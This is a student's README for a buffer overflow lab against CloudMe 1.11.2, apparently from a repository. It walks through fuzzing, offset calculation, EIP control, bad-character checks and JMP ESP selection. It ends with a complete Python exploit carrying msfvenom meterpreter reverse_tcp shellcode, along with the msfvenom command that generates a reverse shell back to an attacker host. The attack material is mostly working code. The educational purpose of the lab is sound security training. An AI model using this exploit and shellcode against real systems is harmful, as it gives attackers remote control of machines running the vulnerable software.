# Buffer-Overflow-Lab-CloudMe-1.11.2
Hands-on cybersecurity lab focused on buffer overflow analysis and exploitation in a controlled environment.

## Overview

This repository documents a hands-on cybersecurity laboratory focused on understanding and analyzing a classic Buffer Overflow vulnerability in a controlled and isolated environment.

The objective of this lab was to learn the methodology used to identify, analyze, and validate a stack-based buffer overflow vulnerability using debugging and reverse engineering techniques.

> This project was conducted exclusively for educational purposes in a virtualized laboratory environment.

---

## Learning Objectives

- Understand the fundamentals of stack-based buffer overflows.
- Perform vulnerability analysis in a controlled environment.
- Learn how memory corruption affects program execution.
- Gain experience using debugging tools.
- Understand exploit development methodology.
- Study common mitigation techniques.

---

## Lab Environment

| Component | Version |
|------------|-----------|
| Victim System | Windows 10 x86 |
| Attacker System | Kali Linux x64 |
| Vulnerable Application | CloudMe 1.11.2 |
| Debugger | Immunity Debugger |
| Analysis Plugin | mona.py |
| Scripting Language | Python |
| Virtualization | Virtual Machine |

---

## Using Immunity Debugger

A virtualized laboratory environment was configured to safely perform the analysis. The target application, CloudMe v1.11.2, was deployed on a Windows 10 virtual machine, while the analysis and testing activities were conducted from a separate Kali Linux system.

Immunity Debugger and Mona.py were used to monitor the application's behavior during the different stages of the assessment and to inspect memory structures when crashes occurred.

- To begin the analysis, Immunity Debugger was launched on the target Windows machine. The CloudMe process was then attached by navigating to **File → Attach** and selecting the running CloudMe process from the available list.

- Once attached, the application could be monitored in real time, allowing inspection of memory regions, processor registers, loaded modules, and execution flow.

- During fuzzing and subsequent testing phases, Immunity Debugger automatically paused execution whenever the application crashed, making it possible to investigate the cause of the memory corruption.

- To resume program execution after attaching to the process, the **Run** button (play icon) located in the toolbar was used.

- Since the application terminated after each crash, CloudMe was restarted and reattached to Immunity Debugger before continuing with additional tests.

- Particular attention was given to the CPU window, where the processor registers are displayed. The **EIP (Extended Instruction Pointer)** register was monitored to verify control over program execution, while the **ESP (Extended Stack Pointer)** register was analyzed to understand stack behavior during the different stages of the assessment.

![Environment Setup](images/Picture1.png)

---

## Methodology

### Phase 1: Fuzzing and Crash Identification

A fuzzing process was performed by sending progressively larger inputs to the application. The purpose of this phase was to observe how the service handled unexpected or oversized data and determine whether memory corruption conditions could be triggered.

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

size = 100

while size < 3000:

    print("\n[+] Sending {} bytes".format(size))

    raw_input("[*] Press Enter to continue...")

    try:
        payload = "A" * size

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((TARGET_IP, TARGET_PORT))
        client.send(payload)
        client.close()

        size += 100

    except:
        print("[!] Crash around {} bytes".format(size))
        break

```

![Attaching Process](images/1_immunityAttach.png)

After multiple iterations, the application crashed when processing an oversized input, indicating the presence of a potential buffer overflow vulnerability. The debugger confirmed that critical memory structures were being affected during the crash.

![Fuzzing Process](images/1_crash1200.png)

#### Evidence

![Fuzzing Result](images/1_errorMessage.png)

---

### Phase 2: Offset Calculation

Once the crash was reproduced consistently, a unique cyclic pattern was used to determine the exact location within memory where execution flow could be influenced.

This process allowed precise identification of the offset required to reach the instruction pointer, an essential step for understanding the impact of the vulnerability and validating exploitability.

![Pattern Created](images/2_patternCreate.png)

_Cyclic Pattern Created_

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

pattern_created = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(pattern_created)
client.close()

print("-> Pattern was send succesfully, check the EIP in Immunity")
```

![Pattern Created](images/2_eipCapture.png)

_EIP Captured_

#### Evidence

![Offset Found](images/2_offsetExact.png)

_Exact Offset Found at 1052_

---

### Phase 3: EIP Control Verification

The calculated offset was validated through controlled testing to confirm that the application's execution flow could be influenced as expected.

The objective of this stage was not to execute arbitrary code but rather to verify that the memory analysis performed in previous phases was accurate and reproducible.

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

EXACT_OFFSET = 1052

fuzz = "A" * EXACT_OFFSET
fuzz += "BBBB"
fuzz += "C" * 500

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(fuzz)
client.close()

print("-> Fuzz was send succesfully, check the EIP, should be 42424242")
```

#### Evidence

![EIP Control](images/3_memoryControl.png)

_EIP: 42424242 | Total Control_

---

### Phase 4: Bad Character Analysis

Input character analysis was conducted to identify bytes that could interfere with memory processing or alter payload behavior.

![Bytearray Creation](images/4_bytearrayCreation.png)

_Bytearray created to look for badchars_

Understanding how the application handles specific characters is important for reliability testing and provides valuable insight into the application's memory management mechanisms.

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

EXACT_OFFSET = 1052

BAD_CHARS = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)


fuzz = "A" * EXACT_OFFSET
fuzz += "BBBB"
fuzz += BAD_CHARS

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(fuzz)
client.close()

print("-> Checking bad characters")
```

#### Evidence

![Bad Characters Analysis](images/4_monaComparisonResults.png)

_No BadChars Found_

---

### Phase 5: Find JMP-ESP | Memory Analysis

```
msf-nasm_shell
nasm > JMP ESP
=> FFE4
```

The memory space of the application was analyzed to study loaded modules and evaluate the presence or absence of modern security protections.

Particular attention was given to mechanisms such as Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), and SafeSEH. This phase helped explain why the application was susceptible to memory corruption attacks and highlighted the importance of secure software design.

```
!mona modules
```
 _Using mona.py to find module with no protection_

 ![Memory Analysis](images/5_noProtectionModule.png)

#### Evidence

![JMP-ESP selected](images/5_jmpSelected.png)


0x68e05735  →  \x35\x57\xe0\x68  (Little Endian)
 _JMP ESP address selected_

---

### Phase 6: Final Validation

The final stage focused on evaluating the security implications of the discovered vulnerability and reviewing defensive measures that could prevent similar issues.

Several mitigation techniques were studied, including secure coding practices, memory protection technologies, software updates, network segmentation, and vulnerability management processes.

This phase reinforced the importance of combining offensive security knowledge with defensive security principles to improve the overall resilience of software systems.

_Generating Shellcode_

```
msfvenom -p windows/meterpreter/reverse_tcp -b "\x00" LHOST=<IP_KALI> LPORT=4444 -f py
```

_Setting Up the Listener_

![Final Validation](images/6_listener.png)

_Exploit Used:_

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

EXACT_OFFSET = 1052
JMP_ESP = "\x35\x57\xe0\x68"

buf =  b""
buf += b"\xba\xa9\x9e\xdf\xbe\xdb\xc6\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x5e\x83\xc0\x04\x31\x50\x11\x03\x50"
buf += b"\x11\xe2\x5c\x62\x37\x31\x9e\x9b\xc8\x2e\xaf\x49"
buf += b"\xac\x25\x9d\x5d\xa4\xdf\xaa\xcc\xba\x94\xfe\xe4"
buf += b"\xf3\x55\xf1\xb3\xbe\x8f\x86\xce\x16\xe1\x58\x82"
buf += b"\x5b\x60\x24\xd9\x8f\x42\x15\x12\xc2\x83\x52\xe4"
buf += b"\xa8\x6c\x0e\xa0\xd9\x21\xbe\xc5\x9c\xf9\xbf\x09"
buf += b"\xab\x42\xc7\x2c\x6c\x36\x7b\x2e\xbd\x3c\xdb\x10"
buf += b"\x6d\xc8\x93\x48\x8c\x1d\xa6\xa0\xfa\x9d\x99\xcd"
buf += b"\x4a\x55\xed\xba\x4c\xbf\x3c\x7d\xe2\xfe\xf1\x70"
buf += b"\xfa\xc7\x35\x6b\x89\x33\x46\x16\x8a\x87\x35\xcc"
buf += b"\x1f\x18\x9d\x87\xb8\xfc\x1c\x4b\x5e\x76\x12\x20"
buf += b"\x14\xd0\x36\xb7\xf9\x6a\x42\x3c\xfc\xbc\xc3\x06"
buf += b"\xdb\x18\x88\xdd\x42\x38\x74\xb3\x7b\x5a\xd0\x6c"
buf += b"\xde\x10\xf2\x7b\x5e\xd9\x0d\x84\x02\x4e\xc2\x49"
buf += b"\xbd\x8e\x4c\xd9\xce\xbc\xd3\x71\x59\x8d\x9c\x5f"
buf += b"\x9e\x84\x8a\x5f\x70\x2e\xda\xa1\x71\x4f\xf3\x65"
buf += b"\x25\x1f\x6b\x4f\x46\xf4\x6b\x70\x93\x61\x61\xe6"
buf += b"\xdc\xde\x11\xed\xb4\x1c\xd9\x0b\x4f\xa8\x3f\x7b"
buf += b"\x1f\xfa\xef\x3c\xcf\xba\x5f\xd5\x05\x35\x80\xc5"
buf += b"\x25\x9f\xa9\x6c\xca\x76\x82\x18\x73\xd3\x58\xb8"
buf += b"\x7c\xc9\x25\xfa\xf7\xf8\xda\xb5\xff\x89\xc8\xa2"
buf += b"\x67\x72\x10\x33\x02\x72\x7a\x37\x84\x25\x12\x35"
buf += b"\xf1\x02\xbd\xc6\xd4\x10\xb9\x39\xa9\x20\xb2\x0c"
buf += b"\x3f\x0d\xac\x70\xaf\x8d\x2c\x27\xa5\x8d\x44\x9f"
buf += b"\x9d\xdd\x71\xe0\x0b\x72\x2a\x75\xb4\x23\x9f\xde"
buf += b"\xdc\xc9\xc6\x29\x43\x31\x2d\x2a\x84\xcd\xb0\x05"
buf += b"\x2d\xa6\x4a\x16\xcd\x36\x20\x96\x9d\x5e\xbf\xb9"
buf += b"\x12\xaf\x40\x10\x7b\xa7\xcb\xf5\xc9\x56\xcc\xdf"
buf += b"\x8c\xc6\xcd\xec\x14\xf8\xb4\x9d\xab\xf9\x49\xb4"
buf += b"\xcf\xf9\x4a\xb8\xf1\xc6\x9d\x81\x87\x09\x1e\xb6"
buf += b"\x88\x97\x8a\xc3\x20\x0e\x5f\x6e\x2d\xb1\x8a\xad"
buf += b"\x48\x32\x3e\x4e\xaf\x2a\x4b\x4b\xeb\xec\xa0\x21"
buf += b"\x64\x99\xc6\x96\x85\x88"

nop_sled = "\x90" * 16


payload = "A" * EXACT_OFFSET
payload += JMP_ESP
payload += nop_sled
payload += buf

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(payload)
client.close()

print("-> Payload send, check your meterpreter session")
```

#### Evidence

![Final Validation](images/6_finalResult.png)

---

## Technical Concepts Covered

- __Stack Memory:__ A region of RAM that operates on a Last-In, First-Out (LIFO) basis, used by programs to store local variables, function arguments, and control data like return addresses.
- __Registers:__ Small, ultra-fast storage locations internal to the CPU (like EAX, ESP, EBP) used to hold temporary data, pointers, and instructions during execution.
- __EIP Control:__ The practice of hijacking the Extended Instruction Pointer (EIP)—the register that points to the next execution command—allowing an attacker to redirect the application's flow to arbitrary code.
- __Memory Corruption:__ A class of software vulnerabilities that occurs when a program inadvertently modifies data in unintended memory locations, often leading to crashes, erratic behavior, or code execution.
- __Fuzzing:__ An automated software testing technique that involves feeding invalid, unexpected, or random data (inputs) into a program to monitor for crashes, leaks, or anomalies.
- __Cyclic Patterns:__ Unique, non-repeating sequences of characters (like those generated by Mona or Metasploit) used as input payloads to easily determine exact memory locations after a crash.
- __Offset Discovery:__ The process of calculating the exact number of bytes required to fill a buffer up to the point where it begins overwriting a critical control register (like EIP).
- __Bad Characters:__ Specific byte values (such as the null byte \x00) that an application filters out, truncates, or interprets incorrectly, which must be excluded from the final shellcode to prevent the exploit from breaking.
- __Debugging:__ The process of monitoring, pausing, and analyzing a program's internal state during runtime using specialized tools (like x64dbg or GDB) to find flaws or understand a crash.
- __Reverse Engineering:__ The practice of analyzing a compiled binary without access to its source code to understand its structure, logic, and inner workings.
- __Vulnerability Analysis:__ The systematic review of a system or binary to identify, quantify, and prioritize security weaknesses and potential entry points for attack.
- __Exploit Development Methodology:__ A structured, step-by-step framework followed by researchers to reliably turn a discovered vulnerability into a working proof-of-concept (PoC) or exploit.

---

## Skills Demonstrated

### Offensive Security

- Vulnerability Identification
- Memory Analysis
- Debugging
- Exploit Methodology
- Security Testing

### Software Security

- Secure Development Awareness
- Risk Analysis
- Vulnerability Assessment
- Defensive Mitigation Analysis

---

## Lessons Learned

This laboratory provided practical experience in:

- Understanding how memory corruption vulnerabilities occur.
- Analyzing application behavior during crashes.
- Using debugging tools effectively.
- Studying exploit development methodology.
- Understanding modern protection mechanisms.

---

## References

- CloudMe 1.11.2
- Immunity Debugger
- mona.py Documentation
- OWASP
- MITRE CWE-120
- Offensive Security Educational Resources

---

## Author

**Esneider Naviel Payarez Salgado**

Systems Engineering Student  
University of La Guajira

---

## License

This repository is intended solely for educational and research purposes.

See DISCLAIMER.md for additional information.
